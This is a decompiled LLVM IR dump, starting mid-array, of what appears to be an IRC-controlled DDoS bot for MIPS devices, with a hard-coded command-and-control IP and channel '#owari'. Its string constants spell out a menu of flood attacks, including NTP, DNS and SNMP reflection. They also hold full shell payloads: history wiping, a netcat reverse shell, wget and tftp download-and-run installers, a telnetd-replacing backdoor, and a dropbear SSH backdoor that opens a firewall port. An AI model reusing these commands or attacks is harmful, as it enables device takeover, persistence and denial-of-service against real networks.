inbounds ([9 x i8], [9 x i8]* @global_var_10028c00.644, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028c0c.645, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c18.646, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10028c20.647, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10028c2c.648, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c3c.649, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c44.650, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028c4c.651, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028c58.652, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028c64.653, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028c70.654, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028c78.655, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10028c7c.656, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c88.540, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028c90.657, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028c98.658, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028c9c.659, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028ca0.660, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028ca4.661, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028ca8.662, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cac.663, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cb0.664, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cb4.665, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cb8.666, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cbc.667, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cc0.668, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cc4.669, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cc8.670, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ccc.671, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cd0.672, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cd4.673, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cd8.674, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cdc.675, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ce0.676, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028ce4.677, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028cec.678, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028cf4.679, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028cfc.680, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d04.681, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d0c.682, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d14.683, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d1c.684, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028d24.685, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d30.686, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d38.687, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028d40.688, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d4c.689, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028d54.690, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d5c.691, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d64.692, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d6c.693, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d74.694, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028d7c.695, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028d84.696, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028d90.697, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028d98.698, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028da0.699, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028da8.700, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028db0.701, i32 0, i32 0)]
@global_var_1002bea8.703 = constant [123 x i8] c"pkill -9 %s || busybox pkill -9 %s || /usr/busybox pkill -9 %s || /bin/busybox pkill -9 %s || /var/run/busybox pkill -9 %s\00"
@global_var_1000efd0.704 = constant [3 x i8] c"8`\00"
@global_var_1002bf24.705 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1002bf3c.706 = constant [29 x i8] c"cd /root;rm -f .bash_history\00"
@global_var_1002bf5c.707 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1002bf74.708 = constant [30 x i8] c"NOTICE %s :%s resolves to %s\0A\00"
@global_var_1000f124.709 = constant i32 1207959580
@global_var_1002bf94.710 = constant [28 x i8] c"NOTICE %s :DNS2IP <domain>\0A\00"
@global_var_1000f140.711 = constant [3 x i8] c"8`\00"
@global_var_1002bfb0.712 = constant [40 x i8] c"NOTICE %s :UPDATEHTTP <host> <src:bin>\0A\00"
@global_var_1000f1cc.713 = constant [3 x i8] c"8`\00"
@global_var_1000f1d4.714 = constant [3 x i8] c"8`\00"
@global_var_1002bfd8.715 = constant [96 x i8] c"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\0A\00"
@global_var_1000f214.716 = constant [3 x i8] c"8`\00"
@global_var_1000f21c.717 = constant i32 939524098
@global_var_1000f2a0.718 = constant [3 x i8] c"8`\00"
@global_var_1000f2a8.719 = constant [3 x i8] c"9?\00"
@global_var_1000f2d8.720 = constant i32 1207959564
@global_var_1000f334.721 = constant [3 x i8] c"8`\00"
@global_var_1002c038.722 = constant [11 x i8] c"gcc --help\00"
@global_var_1002c044.723 = constant [6 x i8] c"Usage\00"
@global_var_1000f3c8.724 = constant i32 1207959564
@global_var_1002c04c.725 = constant [30 x i8] c"NOTICE %s :Receiving update.\0A\00"
@global_var_1002c06c.726 = constant [11 x i8] c"mkdir /tmp\00"
@global_var_1002c078.727 = constant [8 x i8] c"/tmp/.c\00"
@global_var_1000f620.728 = constant i32 1207959588
@global_var_1000f75c.729 = constant i32 1207959588
@global_var_1002c080.730 = constant [70 x i8] c"(gcc -o %s /tmp/.c; rm -f /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1\00"
@global_var_1004dc64.731 = global i32 0
@global_var_1000f7e8.732 = constant i32 1207960312
@global_var_1002c0c8.733 = constant [8 x i8] c"/tmp/.o\00"
@global_var_1000f920.734 = constant i32 1207959588
@global_var_1000fa5c.735 = constant i32 1207959588
@global_var_1002c0d0.736 = constant [188 x i8] c"export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap  1;/tmp/.o '&\00"
@global_var_1000fafc.737 = constant [3 x i8] c"8`\00"
@global_var_1000fb08.738 = constant [3 x i8] c"8`\00"
@global_var_1002c18c.739 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_1000fb74.740 = constant [3 x i8] c"8`\00"
@global_var_10045190.741 = local_unnamed_addr global i32 0
@global_var_1004514c.742 = local_unnamed_addr global i32 0
@global_var_1002c1a8.743 = constant [9 x i8] c"/var/bin\00"
@global_var_1002c1b4.744 = constant [40 x i8] c"NOTICE %s :HACKPGK <url> <binary name>\0A\00"
@global_var_1000fc3c.745 = constant [3 x i8] c"8`\00"
@global_var_1000fc44.746 = constant [3 x i8] c"8`\00"
@global_var_1000fc84.747 = constant [3 x i8] c"8`\00"
@global_var_1000fcd8.748 = constant i32 1207959584
@global_var_1000fcf8.749 = constant i32 939524096
@global_var_1000fdd0.750 = constant [3 x i8] c"8`\00"
@global_var_1000fdd8.751 = constant [3 x i8] c"9?\00"
@global_var_1000fe08.752 = constant i32 1207959564
@global_var_1000fe64.753 = constant [3 x i8] c"8`\00"
@global_var_1002c1dc.754 = constant [277 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_1000fff0.755 = constant i32 1207959588
@global_var_1002c2f4.756 = constant [39 x i8] c"NOTICE %s :Installed %s to hack path.\0A\00"
@global_var_10010154.757 = constant i32 1207959588
@global_var_1002c31c.758 = constant [21 x i8] c"cat %s > /var/bin/%s\00"
@global_var_1002c334.759 = constant [9 x i8] c"rm -f %s\00"
@global_var_1002c340.760 = constant [22 x i8] c"chmod 775 /var/bin/%s\00"
@global_var_1002c358.761 = constant [18 x i8] c"ls -l /var/bin/%s\00"
@global_var_10010288.762 = constant [3 x i8] c"8`\00"
@global_var_1002c36c.763 = constant [55 x i8] c"NOTICE %s :Non-root/non-spoof DDoS commands commands:\0A\00"
@global_var_100102fc.764 = constant [3 x i8] c"8`\00"
@global_var_1002c3a4.765 = constant [69 x i8] c"NOTICE %s :    STD <host> <port> <time> = A non spoofed STD flooder\0A\00"
@global_var_1001031c.766 = constant [3 x i8] c"8`\00"
@global_var_1002c3ec.767 = constant [84 x i8] c"NOTICE %s :    OVH <host> <port> <throttle> <time> = A non spoofed UDP OVH flooder\0A\00"
@global_var_1001033c.768 = constant [3 x i8] c"8`\00"
@global_var_1002c440.769 = constant [84 x i8] c"NOTICE %s :    vTCP <ip> <port> <time> = A non spoofed Randomizer TCP flooder Flag\0A\00"
@global_var_1001035c.770 = constant [3 x i8] c"8`\00"
@global_var_1002c494.771 = constant [74 x i8] c"NOTICE %s :    HOLD <host> <port> <time> = A vanilla TCP connect flooder\0A\00"
@global_var_1001037c.772 = constant [3 x i8] c"8`\00"
@global_var_1002c4e0.773 = constant [75 x i8] c"NOTICE %s :    JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\0A\00"
@global_var_1001039c.774 = constant [3 x i8] c"8`\00"
@global_var_1002c52c.775 = constant [143 x i8] c"NOTICE %s :    UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Freak\0A\00"
@global_var_100103bc.776 = constant [3 x i8] c"8`\00"
@global_var_1002c5bc.777 = constant [105 x i8] c"NOTICE %s :    HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\0A\00"
@global_var_100103dc.778 = constant [3 x i8] c"8`\00"
@global_var_1002c628.779 = constant [60 x i8] c"NOTICE %s :    WGETFLOOD <url> <secs> = An HTTP(S) flooder\0A\00"
@global_var_100103fc.780 = constant [3 x i8] c"8`\00"
@global_var_1002c664.781 = constant [33 x i8] c"NOTICE %s :Spoof/root commands:\0A\00"
@global_var_1001041c.782 = constant [3 x i8] c"8`\00"
@global_var_1002c688.783 = constant [59 x i8] c"NOTICE %s :    UDP <target> <port> <secs> = A UDP flooder\0A\00"
@global_var_1001043c.784 = constant [3 x i8] c"8`\00"
@global_var_1002c6c4.785 = constant [124 x i8] c"NOTICE %s :    VSET <method> <target> <thread> <time> = Valve Source Engine Flood, using the TQuery Engine Source EXPLOIT.\0A\00"
@global_var_1001045c.786 = constant [3 x i8] c"8`\00"
@global_var_1002c740.787 = constant [105 x i8] c"NOTICE %s :    PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_1001047c.788 = constant [3 x i8] c"8`\00"
@global_var_1002c7ac.789 = constant [166 x i8] c"NOTICE %s :    TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\0A\00"
@global_var_1001049c.790 = constant [3 x i8] c"8`\00"
@global_var_1002c854.791 = constant [95 x i8] c"NOTICE %s :    GIGATCP Flooding <target> <flags/method> <secs> = Advanced Spoofed TCP Flooder\0A\00"
@global_var_100104bc.792 = constant [3 x i8] c"8`\00"
@global_var_1002c8b4.793 = constant [141 x i8] c"NOTICE %s :    BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU. USE EXTREME CARE\0A\00"
@global_var_100104dc.794 = constant [3 x i8] c"8`\00"
@global_var_1002c944.795 = constant [85 x i8] c"NOTICE %s :    SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\0A\00"
@global_var_100104fc.796 = constant [3 x i8] c"8`\00"
@global_var_1002c99c.797 = constant [152 x i8] c"NOTICE %s :    NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\0A\00"
@global_var_1001051c.798 = constant [3 x i8] c"8`\00"
@global_var_1002ca34.799 = constant [114 x i8] c"NOTICE %s :    DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\0A\00"
@global_var_1001053c.800 = constant [3 x i8] c"8`\00"
@global_var_1002caa8.801 = constant [159 x i8] c"NOTICE %s :    SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\0A\00"
@global_var_1001055c.802 = constant [3 x i8] c"8`\00"
@global_var_1002cb48.803 = constant [28 x i8] c"NOTICE %s :Other commands:\0A\00"
@global_var_1001057c.804 = constant [3 x i8] c"8`\00"
@global_var_1002cb64.805 = constant [54 x i8] c"NOTICE %s :    RNDNICK = Randomizes the knights nick\0A\00"
@global_var_1001059c.806 = constant [3 x i8] c"8`\00"
@global_var_1002cb9c.807 = constant [61 x i8] c"NOTICE %s :    NICK <nick> = Changes the nick of the client\0A\00"
@global_var_100105bc.808 = constant [3 x i8] c"8`\00"
@global_var_1002cbdc.809 = constant [50 x i8] c"NOTICE %s :    SERVER <server> = Changes servers\0A\00"
@global_var_100105dc.810 = constant [3 x i8] c"8`\00"
@global_var_1002cc10.811 = constant [54 x i8] c"NOTICE %s :    GETSPOOFS = Gets the current spoofing\0A\00"
@global_var_100105fc.812 = constant [3 x i8] c"8`\00"
@global_var_1002cc48.813 = constant [63 x i8] c"NOTICE %s :    SPOOFS <subnet> = Changes spoofing to a subnet\0A\00"
@global_var_1001061c.814 = constant [3 x i8] c"8`\00"
@global_var_1002cc88.815 = constant [66 x i8] c"NOTICE %s :    DISABLE = Disables all packeting from this client\0A\00"
@global_var_1001063c.816 = constant [3 x i8] c"8`\00"
@global_var_1002cccc.817 = constant [64 x i8] c"NOTICE %s :    ENABLE = Enables all packeting from this client\0A\00"
@global_var_1001065c.818 = constant [3 x i8] c"8`\00"
@global_var_1002cd0c.819 = constant [40 x i8] c"NOTICE %s :    KILL = Kills the knight\0A\00"
@global_var_1001067c.820 = constant [3 x i8] c"8`\00"
@global_var_1002cd34.821 = constant [32 x i8] c"NOTICE %s :    DNS2IP <domain>\0A\00"
@global_var_1001069c.822 = constant [3 x i8] c"8`\00"
@global_var_1002cd54.823 = constant [101 x i8] c"NOTICE %s :    GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_100106bc.824 = constant [3 x i8] c"8`\00"
@global_var_1002cdbc.825 = constant [66 x i8] c"NOTICE %s :    UPDATE <http address> <src:bin> = Update this bot\0A\00"
@global_var_100106dc.826 = constant [3 x i8] c"8`\00"
@global_var_1002ce00.827 = constant [108 x i8] c"NOTICE %s :    HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\0A\00"
@global_var_100106fc.828 = constant [3 x i8] c"8`\00"
@global_var_1002ce6c.829 = constant [53 x i8] c"NOTICE %s :    VERSION = Requests version of client\0A\00"
@global_var_1001071c.830 = constant [3 x i8] c"8`\00"
@global_var_1002cea4.831 = constant [54 x i8] c"NOTICE %s :    KILLALL = Kills all current packeting\0A\00"
@global_var_1001073c.832 = constant [3 x i8] c"8`\00"
@global_var_1002cedc.833 = constant [37 x i8] c"NOTICE %s :    HELP = Displays this\0A\00"
@global_var_1001075c.834 = constant [3 x i8] c"8`\00"
@global_var_1002cf04.835 = constant [65 x i8] c"NOTICE %s :    IRC <command> = Sends this command to the server\0A\00"
@global_var_1001077c.836 = constant [3 x i8] c"8`\00"
@global_var_1002cf48.837 = constant [50 x i8] c"NOTICE %s :    SH <command> = Executes a command\0A\00"
@global_var_1001079c.838 = constant [3 x i8] c"8`\00"
@global_var_1002cf7c.839 = constant [66 x i8] c"NOTICE %s :    ISH <command> = SH, interactive, sends to channel\0A\00"
@global_var_100107bc.840 = constant [3 x i8] c"8`\00"
@global_var_1002cfc0.841 = constant [69 x i8] c"NOTICE %s :    SHD <command> = Executes a psuedo-daemonized command\0A\00"
@global_var_100107dc.842 = constant [3 x i8] c"8`\00"
@global_var_1002d008.843 = constant [59 x i8] c"NOTICE %s :    GETBB <tftp server> = Get a proper busybox\0A\00"
@global_var_100107fc.844 = constant [3 x i8] c"8`\00"
@global_var_1002d044.845 = constant [92 x i8] c"NOTICE %s :    INSTALL  <http server/file_name> = Download & install a binary to /var/bin \0A\00"
@global_var_1001081c.846 = constant [3 x i8] c"8`\00"
@global_var_1002d0a0.847 = constant [59 x i8] c"NOTICE %s :    BASH <cmd> = Execute commands using bash. \0A\00"
@global_var_1001083c.848 = constant [3 x i8] c"8`\00"
@global_var_1002d0dc.849 = constant [88 x i8] c"NOTICE %s :    BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \0A\00"
@global_var_1001085c.850 = constant [3 x i8] c"8`\00"
@global_var_1002d134.851 = constant [93 x i8] c"NOTICE %s :    SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \0A\00"
@global_var_1001087c.852 = constant [3 x i8] c"8`\00"
@global_var_1002d194.853 = constant [80 x i8] c"NOTICE %s :    RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\0A\00"
@global_var_1001089c.854 = constant [3 x i8] c"8`\00"
@global_var_1002d1e4.855 = constant [102 x i8] c"NOTICE %s :    LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\0A\00"
@global_var_100108bc.856 = constant [3 x i8] c"8`\00"
@global_var_1002d24c.857 = constant [111 x i8] c"NOTICE %s :    GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\0A\00"
@global_var_100108dc.858 = constant [3 x i8] c"8`\00"
@global_var_100108e4.859 = constant [3 x i8] c"8`\00"
@global_var_1002d2bc.860 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_10045180.861 = local_unnamed_addr global i32 0
@global_var_1002d2d8.862 = constant [21 x i8] c"kill -9 %d;kill -9 0\00"
@global_var_10010ab0.863 = constant [3 x i8] c"8`\00"
@global_var_1002d2f0.864 = constant [5 x i8] c"%s%s\00"
@global_var_1002d2f8.865 = constant i32 553648128
@global_var_1002d2fc.866 = constant [29 x i8] c"NOTICE %s :History cleared!\0A\00"
@global_var_100450a4.867 = local_unnamed_addr global i32 2
@global_var_100288f8.868 = constant [12 x i8] c"Kuze-senpai\00"
@global_var_10028904.869 = constant [9 x i8] c"Morpheus\00"
@global_var_100450a8.870 = global [2 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100288f8.868, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028904.869, i32 0, i32 0)]
@global_var_10010de8.871 = constant i32 939524096
@global_var_1002d43c.872 = constant [5 x i8] c"IRC \00"
@global_var_10010ee4.873 = constant i32 1207959588
@global_var_1002d444.874 = constant [4 x i8] c"%s\0A\00"
@global_var_1002d448.875 = constant [4 x i8] c"SH \00"
@global_var_1002d44c.876 = constant [69 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_1002d494.877 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_10010fdc.878 = constant [3 x i8] c"8`\00"
@global_var_10011000.879 = constant [3 x i8] c"8`\00"
@global_var_1002d4a4.880 = constant [5 x i8] c"SHD \00"
@global_var_1002d4ac.881 = constant [100 x i8] c"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&\00"
@global_var_100110dc.882 = constant [3 x i8] c"8`\00"
@global_var_10011100.883 = constant [3 x i8] c"8`\00"
@global_var_1002d510.884 = constant [7 x i8] c"GETBB \00"
@global_var_1002d518.885 = constant [330 x i8] c"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\22$fileGet\22 ] || [ ! -s /var/\22$fileGet\22 ]) && tftp -g -r \22$fileGet\22 %s && chmod +x \22$fileGet\22 && ./\22$fileGet\22 mkdir bin && ./\22$fileGet\22 --install -s /var/bin && ls -l \22$fileGet\22 || echo It appears we already have /var/\22$fileGet\22)\00"
@global_var_100111dc.886 = constant [3 x i8] c"8`\00"
@global_var_10011200.887 = constant [3 x i8] c"8`\00"
@global_var_1002d664.888 = constant [8 x i8] c"GETSSH \00"
@global_var_1002d66c.889 = constant [668 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \22$url\22 | sed 's#.*/##'` && wget -O \22$name\22 \22$url\22;chmod +x \22$name\22;mv \22$name\22 /var/bin;ls -l /var/bin/\22$name\22 && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT\00"
@global_var_100112dc.890 = constant [3 x i8] c"8`\00"
@global_var_10011300.891 = constant [3 x i8] c"8`\00"
@global_var_1002d908.892 = constant [9 x i8] c"INSTALL \00"
@global_var_1002d914.893 = constant [389 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \22$name either doesnt exist or eq 0 so we get\22 && cd /tmp && wget -O \22$name\22 \22$url\22 && chmod +x \22$name\22 && mv \22$name\22 /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22It appears I already have $name\22)\00"
@global_var_100113dc.894 = constant [3 x i8] c"8`\00"
@global_var_10011400.895 = constant [3 x i8] c"8`\00"
@global_var_1002da9c.896 = constant [11 x i8] c"BINUPDATE \00"
@global_var_1002daa8.897 = constant [371 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22$name doesnt exist, perhaps you mean INSTALL?\22\00"
@global_var_100114dc.898 = constant [3 x i8] c"8`\00"
@global_var_10011500.899 = constant [3 x i8] c"8`\00"
@global_var_1002dc1c.900 = constant [8 x i8] c"LOCKUP \00"
@global_var_1002dc24.901 = constant [235 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)\00"
@global_var_100115dc.902 = constant [3 x i8] c"8`\00"
@global_var_10011600.903 = constant [3 x i8] c"8`\00"
@global_var_1002dd10.904 = constant [8 x i8] c"RSHELL \00"
@global_var_1002dd18.905 = constant [114 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&\00"
@global_var_100116dc.906 = constant [3 x i8] c"8`\00"
@global_var_10011700.907 = constant [3 x i8] c"8`\00"
@global_var_1002dd8c.908 = constant [6 x i8] c"SCAN \00"
@global_var_1002dd94.909 = constant [406 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \22I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/\5Cserver/nmap and INSTALL http://server/scan first...\22 && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)\00"
@global_var_100117dc.910 = constant [3 x i8] c"8`\00"
@global_var_10011800.911 = constant [3 x i8] c"8`\00"
@global_var_1002df2c.912 = constant [6 x i8] c"BASH \00"
@global_var_1002df34.913 = constant [98 x i8] c"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s\00"
@global_var_100118dc.914 = constant [3 x i8] c"8`\00"
@global_var_10011900.915 = constant [3 x i8] c"8`\00"
@global_var_1002d31c.916 = constant [4 x i8] c"STD\00"
@global_var_1004073c.917 = global [4 x i8]* @global_var_1002d31c.916
@global_var_10011be8.918 = constant i32 939524097
@global_var_1002df98.919 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_1004519c.920 = local_unnamed_addr global i32 0
@global_var_1002dfa8.921 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1002dfb8.922 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1002dfc0.923 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1002dfcc.924 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10012040.925 = constant i32 1207959720
@global_var_10012134.929 = constant [3 x i8] c"8`\00"
@global_var_1001225c.930 = constant [3 x i8] c"8`\00"
@global_var_10045098.931 = local_unnamed_addr global i32 1
@global_var_100288e8.932 = constant [14 x i8] c"89.46.222.250\00"
@global_var_1004509c.933 = global [14 x i8]* @global_var_100288e8.932
@global_var_1001244c.934 = constant i32 1207959580
@global_var_100124a4.935 = constant [3 x i8] c"8`\00"
@global_var_10012564.936 = constant i32 1207959668
@global_var_10012598.937 = constant [3 x i8] c"8`\00"
@global_var_10012624.938 = constant i32 939524096
@global_var_10012728.939 = constant [3 x i8] c"8`\00"
@global_var_10012774.940 = constant [3 x i8] c"8`\00"
@global_var_10012780.941 = constant i32 1207961725
@global_var_10012874.951 = constant [3 x i8] c"8`\00"
@global_var_10045188.952 = local_unnamed_addr global i32 0
@global_var_1002e060.953 = constant [7 x i8] c"#owari\00"
@global_var_1002e068.954 = constant i32 0
@global_var_1002e06c.955 = constant [48 x i8] c"NICK [%s|%s]%s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10012968.956 = constant i32 1207959556
@global_var_1002e09c.957 = constant i32 167772160
@global_var_10012d50.958 = constant i32 1207959568
@global_var_10012df8.959 = constant i32 939524096
@global_var_1002e02c.960 = constant [4 x i8] c"352\00"
@global_var_1004086c.961 = global [4 x i8]* @global_var_1002e02c.960
@global_var_1002e0a0.962 = constant [6 x i8] c"ERROR\00"
@global_var_10012f0c.963 = constant [3 x i8] c"8`\00"
@global_var_100496b4.964 = global i32 0
@global_var_100451b0.965 = global i32 0
@global_var_100451b4.966 = global i32 0
@global_var_100451b8.967 = global i32 0
@global_var_10013040.968 = constant i32 1207974481
@global_var_1004ee20.969 = global i32 0
@global_var_1004da14.970 = global i32 0
